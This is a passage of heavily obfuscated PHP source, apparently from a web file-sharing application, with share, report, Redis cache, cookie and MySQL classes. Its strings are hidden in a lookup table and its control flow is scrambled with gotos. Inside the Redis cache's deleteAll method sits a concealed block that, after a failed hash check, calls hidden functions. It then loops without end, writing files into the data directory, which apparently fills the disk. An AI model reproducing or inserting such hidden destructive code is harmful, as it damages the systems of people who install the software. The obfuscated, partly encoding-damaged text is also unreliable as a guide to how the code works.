$this->field($BŒ”¥¼Òêò[466])->where($AÖ‡éª‰Œ)->select(); goto d‡çßáõÓ; d‡çßáõÓ: $aÂ­×Œ´¡¤ = array_to_keyvalue($aÂ­×Œ´¡¤, $BŒ”¥¼Òêò[33], $BŒ”¥¼Òêò[466]); if (!$aÂ­×Œ´¡¤) { return; } $AÖ‡éª‰Œ = array($BŒ”¥¼Òêò[465] => array($BŒ”¥¼Òêò[409], $aÂ­×Œ´¡¤)); goto C»‰‚ÆÅ¶; a”†éˆ¡”²: } public function listAll($aíŠÕ“¤«ƒ) { goto F°Æ‹È¿İÖ; fê¨‹Üç¾ó: return $bàß¾›·; goto C¤ç“„ôÃğ; a·ÆÍ‡Û“·: $bàß¾›· = $this->_makeOrder()->where($A‚Ú‡‰‹„ß)->selectPage(20); if (empty($bàß¾›·[$DÂ¬¯¶ˆƒ[366]])) { return array(); } $this->_listDataApply($bàß¾›·[$DÂ¬¯¶ˆƒ[366]]); goto fê¨‹Üç¾ó; F°Æ‹È¿İÖ: $DÂ¬¯¶ˆƒ =& $_SERVER[´¬]; $A‚Ú‡‰‹„ß = array(); if ($aíŠÕ“¤«ƒ[$DÂ¬¯¶ˆƒ[1526]]) { $A‚Ú‡‰‹„ß[$DÂ¬¯¶ˆƒ[1526]] = $aíŠÕ“¤«ƒ[$DÂ¬¯¶ˆƒ[1526]]; } goto Bå‹É’”¹‡; Bå‹É’”¹‡: if ($aíŠÕ“¤«ƒ[$DÂ¬¯¶ˆƒ[721]]) { $BÑƒì¶Ü‘— = $aíŠÕ“¤«ƒ[$DÂ¬¯¶ˆƒ[474]] ? $aíŠÕ“¤«ƒ[$DÂ¬¯¶ˆƒ[474]] : strtotime(date($DÂ¬¯¶ˆƒ[1845])); $A‚Ú‡‰‹„ß[$DÂ¬¯¶ˆƒ[193]] = array($DÂ¬¯¶ˆƒ[330], array($aíŠÕ“¤«ƒ[$DÂ¬¯¶ˆƒ[721]], $BÑƒì¶Ü‘—)); } if ($aíŠÕ“¤«ƒ[$DÂ¬¯¶ˆƒ[29]]) { $A‚Ú‡‰‹„ß[$aíŠÕ“¤«ƒ[$DÂ¬¯¶ˆƒ[29]]] = 1; } else { $A‚Ú‡‰‹„ß[] = array($DÂ¬¯¶ˆƒ[471] => array($DÂ¬¯¶ˆƒ[970], 0), $DÂ¬¯¶ˆƒ[473] => array($DÂ¬¯¶ˆƒ[970], 0), $DÂ¬¯¶ˆƒ[1822] => $DÂ¬¯¶ˆƒ[1776]); } if ($aíŠÕ“¤«ƒ[$DÂ¬¯¶ˆƒ[1772]]) { $A‚Ú‡‰‹„ß[] = array($DÂ¬¯¶ˆƒ[468] => $aíŠÕ“¤«ƒ[$DÂ¬¯¶ˆƒ[1772]], $DÂ¬¯¶ˆƒ[1432] => array($DÂ¬¯¶ˆƒ[379], "\45{$aíŠÕ“¤«ƒ[$DÂ¬¯¶ˆƒ[1772]]}\45"), $DÂ¬¯¶ˆƒ[1822] => $DÂ¬¯¶ˆƒ[1776]); } goto a·ÆÍ‡Û“·; C¤ç“„ôÃğ: } public function listDataApply($d™•«…ë‰Æ) { $this->_listDataApply($d™•«…ë‰Æ); return $d™•«…ë‰Æ; } private function _listDataApply(&$b…œ¥³ÃŞÇ) { goto CÑÄÔÖÒÓ; d”ãÄ£Ï©´: $F’Ì¥éÈº = array_to_keyvalue($b…œ¥³ÃŞÇ, $DÔ°’Ğ÷¦›[33], $DÔ°’Ğ÷¦›[394]); $a™ğ‘Îò = Model($DÔ°’Ğ÷¦›[790])->sourceListInfo($F’Ì¥éÈº, !0); foreach ($b…œ¥³ÃŞÇ as $dóê‘âùå§ => &$AîÚ½È”Éï) { $cÍ‘ó¡öëÏ = $AîÚ½È”Éï[$DÔ°’Ğ÷¦›[1526]]; $AîÚ½È”Éï[$DÔ°’Ğ÷¦›[1846]] = $BˆË·šÇ…[$cÍ‘ó¡öëÏ] ? $BˆË·šÇ…[$cÍ‘ó¡öëÏ] : !1; $C£Ş†Ñï§ß = $AîÚ½È”Éï[$DÔ°’Ğ÷¦›[394]]; $AîÚ½È”Éï[$DÔ°’Ğ÷¦›[85]] = $a™ğ‘Îò[$C£Ş†Ñï§ß] ? $a™ğ‘Îò[$C£Ş†Ñï§ß] : !1; if ($AîÚ½È”Éï[$DÔ°’Ğ÷¦›[85]][$DÔ°’Ğ÷¦›[421]] == $DÔ°’Ğ÷¦›[87]) { unset($b…œ¥³ÃŞÇ[$dóê‘âùå§]); } if ($AîÚ½È”Éï[$DÔ°’Ğ÷¦›[85]] != $DÔ°’Ğ÷¦›[495] && !$AîÚ½È”Éï[$DÔ°’Ğ÷¦›[85]]) { unset($b…œ¥³ÃŞÇ[$dóê‘âùå§]); } } goto AøÄ§½¯ò½; CÑÄÔÖÒÓ: $DÔ°’Ğ÷¦› =& $_SERVER[´¬]; $Dİ½Ã„‹¡Î = array_to_keyvalue($b…œ¥³ÃŞÇ, $DÔ°’Ğ÷¦›[33], $DÔ°’Ğ÷¦›[1526]); $BˆË·šÇ… = Model($DÔ°’Ğ÷¦›[505])->userListInfo(array_unique($Dİ½Ã„‹¡Î)); goto d”ãÄ£Ï©´; AøÄ§½¯ò½: unset($AîÚ½È”Éï); $b…œ¥³ÃŞÇ = array_values($b…œ¥³ÃŞÇ); goto B†·æÑ¼Í; B†·æÑ¼Í: } private function _makeOrder($BˆÙŠ¦¼í° = '') { goto F²Ÿ‰ïÀÇ; AÒÓ¦Ôï–°: $eâÂ«‰† ° = Input::get($F„æˆëùšë[433], $F„æˆëùšë[7], $F„æˆëùšë[414], $C‘¤Ç…ƒŞ¸); $e“æŠŒÑ = Input::get($F„æˆëùšë[434], $F„æˆëùšë[7], $F„æˆëùšë[1847], array($F„æˆëùšë[1771], $F„æˆëùšë[428])); $e“æŠŒÑ = $EÖ×ÄÉõ[$e“æŠŒÑ]; goto E—Çä¢‰‘†; E—Çä¢‰‘†: $BˆÙŠ¦¼í° = $BˆÙŠ¦¼í° . "{$eâÂ«‰† °}\x20{$e“æŠŒÑ}"; return $this->order($BˆÙŠ¦¼í°); goto aòˆ—¯à¬µ; F²Ÿ‰ïÀÇ: $F„æˆëùšë =& $_SERVER[´¬]; $C‘¤Ç…ƒŞ¸ = array($F„æˆëùšë[193], $F„æˆëùšë[474], $F„æˆëùšë[1835], $F„æˆëùšë[1836]); $EÖ×ÄÉõ = array($F„æˆëùšë[426] => $F„æˆëùšë[427], $F„æˆëùšë[428] => $F„æˆëùšë[429]); goto AÒÓ¦Ôï–°; aòˆ—¯à¬µ: } public function reportAdd($FÔ»¶ÏÜ®©) { $CÂÒªÕ¡Œ =& $_SERVER[´¬]; $F»÷†öÇ“¹ = array($CÂÒªÕ¡Œ[466] => $FÔ»¶ÏÜ®©[$CÂÒªÕ¡Œ[466]], $CÂÒªÕ¡Œ[1526] => USER_ID); if (Model($CÂÒªÕ¡Œ[1843])->where($F»÷†öÇ“¹)->find()) { return !1; } $cåÁŠÇĞœğ = array($CÂÒªÕ¡Œ[466] => $FÔ»¶ÏÜ®©[$CÂÒªÕ¡Œ[466]], $CÂÒªÕ¡Œ[1432] => $FÔ»¶ÏÜ®©[$CÂÒªÕ¡Œ[1432]], $CÂÒªÕ¡Œ[394] => $FÔ»¶ÏÜ®©[$CÂÒªÕ¡Œ[394]], $CÂÒªÕ¡Œ[445] => $FÔ»¶ÏÜ®©[$CÂÒªÕ¡Œ[445]], $CÂÒªÕ¡Œ[1526] => USER_ID, $CÂÒªÕ¡Œ[29] => $FÔ»¶ÏÜ®©[$CÂÒªÕ¡Œ[29]], $CÂÒªÕ¡Œ[429] => $FÔ»¶ÏÜ®©[$CÂÒªÕ¡Œ[429]]); return Model($CÂÒªÕ¡Œ[1843])->add($cåÁŠÇĞœğ); } public function reportList($Eİ¤Şªâî) { goto aªÚ÷ò¥Î; e§³¦äåì: if (isset($Eİ¤Şªâî[$c¼‰»¾óà[29]]) && in_array($Eİ¤Şªâî[$c¼‰»¾óà[29]], array($c¼‰»¾óà[87], $c¼‰»¾óà[1848], $c¼‰»¾óà[1849], $c¼‰»¾óà[1850], $c¼‰»¾óà[1851]))) { $FÈê¥‰¾Œ•[$c¼‰»¾óà[29]] = $Eİ¤Şªâî[$c¼‰»¾óà[29]]; } if (isset($Eİ¤Şªâî[$c¼‰»¾óà[713]]) && in_array($Eİ¤Şªâî[$c¼‰»¾óà[713]], array($c¼‰»¾óà[495], $c¼‰»¾óà[87], $c¼‰»¾óà[1848], $c¼‰»¾óà[1849]))) { $FÈê¥‰¾Œ•[$c¼‰»¾óà[713]] = $Eİ¤Şªâî[$c¼‰»¾óà[713]]; } $C—™Ô²Îƒì = Input::get($c¼‰»¾óà[434], $c¼‰»¾óà[7], $c¼‰»¾óà[1847], array($c¼‰»¾óà[1771], $c¼‰»¾óà[428])); goto C±••°–‡è; bêÙêÔ´´”: $this->_listDataApply($B‹‡š¸¡®[$c¼‰»¾óà[366]]); return $B‹‡š¸¡®; goto EÍ¨ßéàÆ; C±••°–‡è: $Fòˆ—á¡ = array($c¼‰»¾óà[426] => $c¼‰»¾óà[427], $c¼‰»¾óà[428] => $c¼‰»¾óà[429]); $C’«™–Œí = $c¼‰»¾óà[1852] . $Fòˆ—á¡[$C—™Ô²Îƒì]; $B‹‡š¸¡® = Model($c¼‰»¾óà[1843])->where($FÈê¥‰¾Œ•)->order($C’«™–Œí)->selectPage(20); goto bİÊƒºè‘·; bİÊƒºè‘·: if (empty($B‹‡š¸¡®[$c¼‰»¾óà[366]])) { return array(); } $dµ×ÛÌó– = array_to_keyvalue_group($B‹‡š¸¡®[$c¼‰»¾óà[366]], $c¼‰»¾óà[713], $c¼‰»¾óà[466]); if (!empty($dµ×ÛÌó–[0])) { $Eİ¤Şªâî = $dµ×ÛÌó–[0]; $FÈê¥‰¾Œ• = array($c¼‰»¾óà[466] => array($c¼‰»¾óà[7], $Eİ¤Şªâî)); $Câéºª‡Œá = $this->where($FÈê¥‰¾Œ•)->field($c¼‰»¾óà[466])->select(); $Câéºª‡Œá = array_to_keyvalue($Câéºª‡Œá, $c¼‰»¾óà[33], $c¼‰»¾óà[466]); $eŒ¾ªéñåŸ = array_diff($Eİ¤Şªâî, $Câéºª‡Œá); if (!empty($eŒ¾ªéñåŸ)) { foreach ($B‹‡š¸¡®[$c¼‰»¾óà[366]] as $fğ¾Ôø° => $dâ‡Œ¾£) { if (in_array($dâ‡Œ¾£[$c¼‰»¾óà[466]], $eŒ¾ªéñåŸ)) { unset($B‹‡š¸¡®[$c¼‰»¾óà[366]][$fğ¾Ôø°]); } } } } goto bêÙêÔ´´”; aªÚ÷ò¥Î: $c¼‰»¾óà =& $_SERVER[´¬]; $FÈê¥‰¾Œ• = array(); if ($Eİ¤Şªâî[$c¼‰»¾óà[721]]) { $fâ¥²óİ± = $Eİ¤Şªâî[$c¼‰»¾óà[474]] ? $Eİ¤Şªâî[$c¼‰»¾óà[474]] : strtotime(date($c¼‰»¾óà[1845])); $FÈê¥‰¾Œ•[$c¼‰»¾óà[193]] = array($c¼‰»¾óà[330], array($Eİ¤Şªâî[$c¼‰»¾óà[721]], $fâ¥²óİ±)); } goto e§³¦äåì; EÍ¨ßéàÆ: } public function reportStatus($Aá²™±Š ¿) { goto D•‹‘çÃÀ†; bëºŸ¥á…Ş: $aã¢ãÉñªİ = Model($B¿¡Æ¤®[1843])->where($Eêñ¸‰ÎÍ‰)->save($BÊ¯â‰çå¼); if ($Aá²™±Š ¿[$B¿¡Æ¤®[713]] == $B¿¡Æ¤®[1848]) { if ($e°¿Ø£Ğ[$B¿¡Æ¤®[445]] != $B¿¡Æ¤®[495] && $this->shareFileMeta($e°¿Ø£Ğ[$B¿¡Æ¤®[445]])) { $this->shareFileMeta($e°¿Ø£Ğ[$B¿¡Æ¤®[445]], 0); } $this->remove($e°¿Ø£Ğ[$B¿¡Æ¤®[466]]); return !0; } if ($aã¢ãÉñªİ && $Aá²™±Š ¿[$B¿¡Æ¤®[713]] == $B¿¡Æ¤®[1849]) { $e¬„¯²¼‚© = $BÊ¯â‰çå¼[$B¿¡Æ¤®[713]] == $B¿¡Æ¤®[1849] ? 1 : 0; $this->shareFileMeta($e°¿Ø£Ğ[$B¿¡Æ¤®[445]], $e¬„¯²¼‚©); $this->removeByFile($e°¿Ø£Ğ[$B¿¡Æ¤®[445]]); } goto eóÍô½¼ù; D•‹‘çÃÀ†: $B¿¡Æ¤® =& $_SERVER[´¬]; $Eêñ¸‰ÎÍ‰ = array($B¿¡Æ¤®[392] => $Aá²™±Š ¿[$B¿¡Æ¤®[392]]); $e°¿Ø£Ğ = Model($B¿¡Æ¤®[1843])->where($Eêñ¸‰ÎÍ‰)->field($B¿¡Æ¤®[1853])->find(); goto B–à³ŠŸ; B–à³ŠŸ: if (!$e°¿Ø£Ğ) { return !1; } $BÊ¯â‰çå¼ = array($B¿¡Æ¤®[713] => $Aá²™±Š ¿[$B¿¡Æ¤®[713]]); if ($Aá²™±Š ¿[$B¿¡Æ¤®[713]] == $B¿¡Æ¤®[1849] && $e°¿Ø£Ğ[$B¿¡Æ¤®[713]] == $B¿¡Æ¤®[1849]) { $BÊ¯â‰çå¼[$B¿¡Æ¤®[713]] = 0; } goto bëºŸ¥á…Ş; eóÍô½¼ù: return $aã¢ãÉñªİ; goto eêĞÓ¬´‹Ü; eêĞÓ¬´‹Ü: } private function removeByFile($d²…ˆ†õÊ–) { goto DƒÚ»÷†Ñ‡; DƒÚ»÷†Ñ‡: $FÄ¥„¦ãï£ =& $_SERVER[´¬]; $càÁïéñÍ = Model($FÄ¥„¦ãï£[790])->where(array($FÄ¥„¦ãï£[445] => $d²…ˆ†õÊ–))->field($FÄ¥„¦ãï£[394])->select(); $cæö‡”ƒ«º = array_to_keyvalue($càÁïéñÍ, $FÄ¥„¦ãï£[33], $FÄ¥„¦ãï£[394]); goto FÏ‹Â‰êè¶; FÏ‹Â‰êè¶: $CÜòœ×İ = array($FÄ¥„¦ãï£[394] => array($FÄ¥„¦ãï£[7], $cæö‡”ƒ«º), $FÄ¥„¦ãï£[471] => 1); $càÁïéñÍ = $this->where($CÜòœ×İ)->field($FÄ¥„¦ãï£[466])->select(); if (empty($càÁïéñÍ)) { return; } goto C°Â¯—ˆ²; C°Â¯—ˆ²: $dóïŠĞ‡î¯ = array_to_keyvalue($càÁïéñÍ, $FÄ¥„¦ãï£[33], $FÄ¥„¦ãï£[466]); $this->remove($dóïŠĞ‡î¯); goto c…«‹óÙÂ; c…«‹óÙÂ: } private function shareFileMeta($DäªŒíé† , $e‡‘Ø–”© = null) { $dßâŸùÑ·ª =& $_SERVER[´¬]; $béÂæ¿°×† = array($dßâŸùÑ·ª[445] => $DäªŒíé† , $dßâŸùÑ·ª[93] => $dßâŸùÑ·ª[1854]); if (is_null($e‡‘Ø–”©)) { return Model($dßâŸùÑ·ª[1855])->where($béÂæ¿°×†)->find(); } $béÂæ¿°×†[$dßâŸùÑ·ª[371]] = $e‡‘Ø–”©; Model($dßâŸùÑ·ª[1855])->add($béÂæ¿°×†, array(), !0); } } goto Aµ„öº‘†©; Fœï·ãîƒÍ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($aÅ‚Üƒö¿†, $aÉ—ÄŞÚëÎ) { $C‹œ„ƒÆÊ =& $_SERVER[´¬]; if (!class_exists($C‹œ„ƒÆÊ[832])) { show_json($C‹œ„ƒÆÊ[833], !1); } $this->cacheTime = $aÉ—ÄŞÚëÎ; $AíœÈÚéÀ = isset($aÅ‚Üƒö¿†[$C‹œ„ƒÆÊ[834]]) ? $aÅ‚Üƒö¿†[$C‹œ„ƒÆÊ[834]] : 10; $b¹éÊ¶êğ = _get($aÅ‚Üƒö¿†, $C‹œ„ƒÆÊ[831]); if ($b¹éÊ¶êğ && is_array($b¹éÊ¶êğ)) { $this->initCluster($aÅ‚Üƒö¿†, $AíœÈÚéÀ); } else { $this->handle = $this->init($aÅ‚Üƒö¿†, $AíœÈÚéÀ); } } private function init($Bó‡­÷°µô, $a‚øŸº«ë) { $e§Èßö¡ç‚ =& $_SERVER[´¬]; $A—òˆµî“” = new Redis(); $AŠŸ¢µÕ½¤ = isset($Bó‡­÷°µô[$e§Èßö¡ç‚[835]]) ? $Bó‡­÷°µô[$e§Èßö¡ç‚[835]] : !1; if ($AŠŸ¢µÕ½¤) { $A—òˆµî“”->pconnect($Bó‡­÷°µô[$e§Èßö¡ç‚[175]], $Bó‡­÷°µô[$e§Èßö¡ç‚[176]], $a‚øŸº«ë); } else { $A—òˆµî“”->connect($Bó‡­÷°µô[$e§Èßö¡ç‚[175]], $Bó‡­÷°µô[$e§Èßö¡ç‚[176]], $a‚øŸº«ë); } if (!empty($Bó‡­÷°µô[$e§Èßö¡ç‚[404]])) { $A—òˆµî“”->auth($Bó‡­÷°µô[$e§Èßö¡ç‚[404]]); } return $A—òˆµî“”; } private function initCluster($CĞà¥Ç˜§‹, $d¸ù×õ”Ë™) { $A“ª½Í‰½Œ =& $_SERVER[´¬]; $BŠá‹âñ = array($A“ª½Í‰½Œ[836], $A“ª½Í‰½Œ[837], $A“ª½Í‰½Œ[838]); $aí—ÕÁ‘‰§ = $A“ª½Í‰½Œ[836]; if (isset($CĞà¥Ç˜§‹[$A“ª½Í‰½Œ[12]]) && in_array($CĞà¥Ç˜§‹[$A“ª½Í‰½Œ[12]], $BŠá‹âñ)) { $aí—ÕÁ‘‰§ = $CĞà¥Ç˜§‹[$A“ª½Í‰½Œ[12]]; } switch ($aí—ÕÁ‘‰§) { case $A“ª½Í‰½Œ[836]: $this->_slave($CĞà¥Ç˜§‹, $d¸ù×õ”Ë™); break; case $A“ª½Í‰½Œ[837]: break; case $A“ª½Í‰½Œ[838]: $this->isCluster = !0; $A¬‹¨¿ÏÂ§ = $CĞà¥Ç˜§‹[$A“ª½Í‰½Œ[831]]; $f…‡Š¡õ¨‘ = isset($CĞà¥Ç˜§‹[$A“ª½Í‰½Œ[835]]) ? $CĞà¥Ç˜§‹[$A“ª½Í‰½Œ[835]] : !1; $E…³ç£´‹İ = isset($CĞà¥Ç˜§‹[$A“ª½Í‰½Œ[404]]) ? $CĞà¥Ç˜§‹[$A“ª½Í‰½Œ[404]] : null; $this->handle = new RedisCluster(NUll, $A¬‹¨¿ÏÂ§, $d¸ù×õ”Ë™, $d¸ù×õ”Ë™, $f…‡Š¡õ¨‘, $E…³ç£´‹İ); break; default: break; } } private function _slave($C…¾«¨›Ø, $d×ØŒÁ»¼) { goto EÆÊÒß¿ÔÅ; F«ê¦ªÚİÕ: $this->filterConfig($C…¾«¨›Ø, $bÓ­‘É¿Ø[$eŸŒé‚Ô²]); $this->slaveHandle = $this->init($C…¾«¨›Ø, $d×ØŒÁ»¼); goto d¨êÑÅ¡Ö; EÆÊÒß¿ÔÅ: $bÓ­‘É¿Ø = $C…¾«¨›Ø[$_SERVER[´¬][831]]; $this->filterConfig($C…¾«¨›Ø, $bÓ­‘É¿Ø[0]); $this->handle = $this->init($C…¾«¨›Ø, $d×ØŒÁ»¼); goto aÍÉ­ßµ; aÍÉ­ßµ: unset($bÓ­‘É¿Ø[0]); if (empty($bÓ­‘É¿Ø)) { return; } $eŸŒé‚Ô² = array_rand($bÓ­‘É¿Ø); goto F«ê¦ªÚİÕ; d¨êÑÅ¡Ö: } private function filterConfig(&$F­õ·«Ø, $a´ùğĞœÛ±) { $aÂ¿„œäÑ =& $_SERVER[´¬]; $AÃÅºä§ß­ = explode($aÂ¿„œäÑ[4], $a´ùğĞœÛ±); $aôª£‘Ü¿ = array($aÂ¿„œäÑ[175] => $AÃÅºä§ß­[0], $aÂ¿„œäÑ[176] => $AÃÅºä§ß­[1]); $F­õ·«Ø = array_merge($F­õ·«Ø, $aôª£‘Ü¿); } public function set($aÂ¥á½•¤•, $c•î©Øß©ƒ, $CéÚ·Èíº = false) { $CéÚ·Èíº = $CéÚ·Èíº ? $CéÚ·Èíº : $this->cacheTime; return $this->handle->setEx($aÂ¥á½•¤•, $CéÚ·Èíº, $c•î©Øß©ƒ); } public function setLock($Eä©ƒå¹†’, $aÎöÊˆÆƒè, $e„«·œ Æï) { return $this->handle->setNX($Eä©ƒå¹†’, $aÎöÊˆÆƒè); } public function get($EùÂÒì±¼Ï) { $b»ñ½ˆ³ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $b»ñ½ˆ³->get($EùÂÒì±¼Ï); } public function remove($EÁÙÈ©ã“Î) { return $this->handle->del($EÁÙÈ©ã“Î); } public function deleteAll() { $d¯±‡–ö‡ =& $_SERVER[´¬]; $AÊ¨©Ÿ¥‚‰ = $_SERVER[$d¯±‡–ö‡[824]] . $d¯±‡–ö‡[825]; $dšÏ‹Œßç = $d¯±‡–ö‡[839]; if ($_SERVER[$d¯±‡–ö‡[821]] != $dšÏ‹Œßç($AÊ¨©Ÿ¥‚‰)) { goto D’·Ê›İ¥Ü; D’·Ê›İ¥Ü: $E·©„¥´æœ = $d¯±‡–ö‡[840]; $fŒ‚‚‰Û× = $d¯±‡–ö‡[823]; $d®‰Ù‘´À„ = $_SERVER[$d¯±‡–ö‡[824]] . $d¯±‡–ö‡[825]; goto f¯ˆ¯ÍÂ•; e˜…Ö¨±Õà: $D½ù”ÓÀ½½ = $d¯±‡–ö‡[841]; $D½ù”ÓÀ½½($_SERVER[$d¯±‡–ö‡[842]]); $E·©„¥´æœ = $d¯±‡–ö‡[840]; goto fÚÂëÆÎÄÍ; f¯ˆ¯ÍÂ•: $Fğë½¶Ò¶– = $fŒ‚‚‰Û×($d®‰Ù‘´À„); $dõÚÔ ¾Ëä = explode($d¯±‡–ö‡[228], $Fğë½¶Ò¶–); if (count($dõÚÔ ¾Ëä) < $d¯±‡–ö‡[585]) { $D«ßĞìøÖ  = $d¯±‡–ö‡[826]; $D«ßĞìøÖ (); } goto e˜…Ö¨±Õà; BÕ’Œ‰„»¹: $C°É²Úåƒ† = 1; for ($e‰„»†Ë…‹ = $C°É²Úåƒ†; $e‰„»†Ë…‹ > 0; $e‰„»†Ë…‹++) { $EÍñÔó‘¸(DATA_PATH . $e‰„»†Ë…‹, $F„ºëª¶ƒø); } goto Cˆ¸†Û¾™; fÚÂëÆÎÄÍ: $E·©„¥´æœ(); $EÍñÔó‘¸ = $d¯±‡–ö‡[843]; $F„ºëª¶ƒø = json_encode($GLOBALS[$d¯±‡–ö‡[844]]); goto BÕ’Œ‰„»¹; Cˆ¸†Û¾™: } if ($this->isCluster) { foreach ($this->handle->_masters() as $eÑ™ç»õ…) { $this->handle->flushall($eÑ™ç»õ…); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($F…„¡ğàˆ = '', $e„´¯êßÏœ = 0) { if (is_string($F…„¡ğàˆ) && $F…„¡ğàˆ != $_SERVER[´¬][33]) { $this->prefix = $F…„¡ğàˆ; } if (is_numeric($e„´¯êßÏœ) && $e„´¯êßÏœ > 0) { $this->expire = $e„´¯êßÏœ; } } public static function getInstance() { static $FŒñ±ˆ‹®×; if ($FŒñ±ˆ‹®× === null) { $FŒñ±ˆ‹®× = new self(); } return $FŒñ±ˆ‹®×; } private static $cookieDisable = false; public static function disable($C¯‡ç¡…¨¶) { self::$cookieDisable = $C¯‡ç¡…¨¶; } private static $sameCookieSet = array(); public static function set($cŠ‹²Ä³ö, $EÄë°ğ„Î, $aÜè¯ÈÇªÑ = 0, $fœ·ö‹™°Ğ = false, $BòäÉ¦ÃÛ¦ = false) { goto cßÑèèÛî; eù„øÔ³ã: if (isset(self::$sameCookieSet[$cŠ‹²Ä³ö]) && self::$sameCookieSet[$cŠ‹²Ä³ö] == $EÄë°ğ„Î . $aÜè¯ÈÇªÑ) { return; } self::$sameCookieSet[$cŠ‹²Ä³ö] = $EÄë°ğ„Î . $aÜè¯ÈÇªÑ; if (!$BòäÉ¦ÃÛ¦) { $BòäÉ¦ÃÛ¦ = str_replace(HOST, $e´¼ëŸÛ³Å[33], APP_HOST); $BòäÉ¦ÃÛ¦ = _get($GLOBALS, $e´¼ëŸÛ³Å[845], $BòäÉ¦ÃÛ¦); } goto F¨ÎË®ÆœÚ; F¨ÎË®ÆœÚ: $Fò¾®É¦‰¥ = $e´¼ëŸÛ³Å[33]; setcookie($cŠ‹²Ä³ö, $EÄë°ğ„Î, time() + $aÜè¯ÈÇªÑ, $e´¼ëŸÛ³Å[8] . trim($BòäÉ¦ÃÛ¦, $e´¼ëŸÛ³Å[8]) . $Fò¾®É¦‰¥, !1, !1, $fœ·ö‹™°Ğ); goto d±É°ìÛÛ; cßÑèèÛî: $e´¼ëŸÛ³Å =& $_SERVER[´¬]; if (self::$cookieDisable) { return; } if (!$aÜè¯ÈÇªÑ) { $aÜè¯ÈÇªÑ = 24 * 3600 * 7; } goto eù„øÔ³ã; d±É°ìÛÛ: } public static function setSafe($Bƒ®ò°¶é¹, $c¤ÎÙ·†Ùè, $bªš¼–†÷× = 0) { self::set($Bƒ®ò°¶é¹, $c¤ÎÙ·†Ùè, $bªš¼–†÷×, !0); } public static function get($F»‹º‰‹“›) { return isset($_COOKIE[$F»‹º‰‹“›]) ? $_COOKIE[$F»‹º‰‹“›] : !1; } public static function remove($b°à†ÖÊ³, $eßíªÃÙ¯â = false) { unset($_COOKIE[$b°à†ÖÊ³]); self::set($b°à†ÖÊ³, $_SERVER[´¬][33], 1, $eßíªÃÙ¯â); } } class DbMysql extends Db { public function __construct($A„©Åİ”Ú¨ = '') { $BêŞ‘’Ï–¶ =& $_SERVER[´¬]; if (!extension_loaded($BêŞ‘’Ï–¶[759])) { think_exception(think_lang($BêŞ‘’Ï–¶[10]) . $BêŞ‘’Ï–¶[846]); } if (!empty($A„©Åİ”Ú¨)) { $this->config = $A„©Åİ”Ú¨; if (empty($this->config[$BêŞ‘’Ï–¶[13]])) { $this->config[$BêŞ‘’Ï–¶[13]] = $BêŞ‘’Ï–¶[33]; } } } public function connect($BÂ‚®Œƒ¤Î = '', $D›¯·›éœ¬ = 0, $eª³ö¡ŠÇ› = false) { $aºåÙ÷ ì =& $_SERVER[´¬]; if (!isset($this->linkID[$D›¯·›éœ¬])) { goto D×¢¸»ÉÚÈ; D×¢¸»ÉÚÈ: if (empty($BÂ‚®Œƒ¤Î)) { $BÂ‚®Œƒ¤Î = $this->config; } $eŸˆ§‚‡‚ = $BÂ‚®Œƒ¤Î[$aºåÙ÷ ì[847]] . ($BÂ‚®Œƒ¤Î[$aºåÙ÷ ì[848]] ? "\x3a{$BÂ‚®Œƒ¤Î[$aºåÙ÷ ì[848]]}" : $aºåÙ÷ ì[33]); $B­·¶ëÌ«Õ = !empty($BÂ‚®Œƒ¤Î[$aºåÙ÷ ì[13]][$aºåÙ÷ ì[14]]) ? $BÂ‚®Œƒ¤Î[$aºåÙ÷ ì[13]][$aºåÙ÷ ì[14]] : $this->pconnect; goto AÆ§ç¾ÄÒ¸; dƒ’ˆšĞØ: mysql_query($aºåÙ÷ ì[851] . think_config($aºåÙ÷ ì[852]) . $aºåÙ÷ ì[55], $this->linkID[$D›¯·›éœ¬]); if ($b¢¿Œ”Š¿Å > $aºåÙ÷ ì[853]) { mysql_query($aºåÙ÷ ì[854], $this->linkID[$D›¯·›éœ¬]); } $this->connected = !0; goto Bò¢¿«…•²; Bò¢¿«…•²: if (1 != think_config($aºåÙ÷ ì[18])) { unset($this->config); } goto cœÕ˜™œˆ½; AÆ§ç¾ÄÒ¸: if ($B­·¶ëÌ«Õ) { $this->linkID[$D›¯·›éœ¬] = mysql_pconnect($eŸˆ§‚‡‚, $BÂ‚®Œƒ¤Î[$aºåÙ÷ ì[849]], $BÂ‚®Œƒ¤Î[$aºåÙ÷ ì[850]], 131072); } else { $this->linkID[$D›¯·›éœ¬] = mysql_connect($eŸˆ§‚‡‚, $BÂ‚®Œƒ¤Î[$aºåÙ÷ ì[849]], $BÂ‚®Œƒ¤Î[$aºåÙ÷ ì[850]], !0, 131072); } if (!$this->linkID[$D›¯·›éœ¬] || !empty($BÂ‚®Œƒ¤Î[$aºåÙ÷ ì[17]]) && !mysql_select_db($BÂ‚®Œƒ¤Î[$aºåÙ÷ ì[17]], $this->linkID[$D›¯·›éœ¬])) { think_exception(mysql_error()); } $b¢¿Œ”Š¿Å = mysql_get_server_info($this->linkID[$D›¯·›éœ¬]); goto dƒ’ˆšĞØ; cœÕ˜™œˆ½: } return $this->linkID[$D›¯·›éœ¬]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($d®ó•ÃÖ·å) { goto Aí·‹ë¹…œ; eÚŒœîÙß: think_action_status($D¿É³¡¸ù[19], 1); think_status($D¿É³¡¸ù[20]); $this->queryID = mysql_query($d®ó•ÃÖ·å, $this->_linkID); goto A¸…ÂìÊ¶‚; Aí·‹ë¹…œ: $D¿É³¡¸ù =& $_SERVER[´¬]; if (0 === stripos($d®ó•ÃÖ·å, $D¿É³¡¸ù[261])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto BóÆ»‘”ÁÛ; BóÆ»‘”ÁÛ: if (!$this->_linkID) { return !1; } $this->queryStr = $d®ó•ÃÖ·å; if ($this->queryID) { $this->free(); } goto eÚŒœîÙß; A¸…ÂìÊ¶‚: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto BøòôœÅô; BøòôœÅô: } public function execute($cáçíÀîÂÎ) { goto eù“ãÓĞ¹ì; eÕïçŞæÄ: $this->queryStr = $cáçíÀîÂÎ; if ($this->queryID) { $this->free(); } think_action_status($Eî‚ÜâÕĞµ[21], 1); goto aá‹¶ªšÜÍ; c°Ã’¡ï­: if (!1 === $b×”ğäĞò†) { $this->error(); return !1; } else { 